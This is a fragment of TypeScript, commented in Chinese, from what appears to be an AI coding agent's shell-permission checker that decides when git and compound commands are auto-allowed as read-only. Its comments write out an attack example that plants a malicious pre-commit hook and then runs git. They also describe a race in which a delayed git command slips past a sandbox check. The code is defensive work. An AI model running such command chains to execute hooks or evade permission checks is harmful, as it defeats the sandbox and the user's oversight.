  // 安全：阻止写入 git 内部路径并运行 git 的复合命令
  // 防止命令创建 git 内部文件（HEAD、objects/、refs/、hooks/）
  // 然后运行 git，后者将从新创建的文件执行恶意钩子。
  // 攻击示例：mkdir -p hooks && echo '恶意代码' > hooks/pre-commit && git status
  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
    return {
      behavior: 'passthrough',
      message:
        '创建 git 内部文件并运行 git 的复合命令需要权限检查以增强安全性',
    }
  }

  // 安全：仅当我们在原始 cwd（受沙箱 denyWrite 保护）或沙箱禁用时
  //（攻击无效），才自动将 git 命令允许为只读。
  // 竞态条件：沙箱中的命令可以在子目录中创建裸仓库文件，
  // 而后台运行的 git 命令（例如 sleep 10 && git status）在评估时
  // 会通过 isCurrentDirectoryBareGitRepo() 检查——此时文件尚未存在。
  if (
    hasGitCommand &&
    SandboxManager.isSandboxingEnabled() &&
    getCwd() !== getOriginalCwd()
  ) {
    return {
      behavior: 'passthrough',
      message:
        '沙箱启用时，原始工作目录之外的 Git 命令需要权限检查',
    }
  }

  // 检查所有子命令是否都是只读的
  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
    subcmd => {
      if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
        return false
      }
      return isCommandReadOnly(subcmd)
    },
  )

  if (allSubcommandsReadOnly) {
    return {
      behavior: 'allow',
      updatedInput: input,
    }
  }

  // 如果不是只读的，返回 passthrough 让其他权限检查处理
  return {
    behavior: 'passthrough',
    message: '命令不是只读操作，需要进一步权限检查',
  }
}
